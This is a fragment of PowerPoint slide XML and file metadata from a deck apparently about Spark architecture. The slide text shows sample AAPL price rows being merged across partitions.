                </a:solidFill>
              </a:rPr>
              <a:t>PURPLE s0    50     AAPL     185.00                                 185.0      --</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="800">
                <a:solidFill>
                  <a:srgbClr val="323232"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PURPLE s1    50     AAPL     186.00 + 187.00                     373.0      --</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="800">
                <a:solidFill>
                  <a:srgbClr val="323232"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PURPLE merged  50  AAPL     --                                        --          558.0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92824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SDE_Spark Architecture  |  March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3112" y="6592824"/>
            <a:ext cx="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4415</TotalTime>
  <Words>7498</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Custom</PresentationFormat>
  <Paragraphs>958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Dimitris Meliopoulos</cp:lastModifiedBy>
  <cp:revision>32</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-01-27T09:14:16Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-25T11:28:56Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>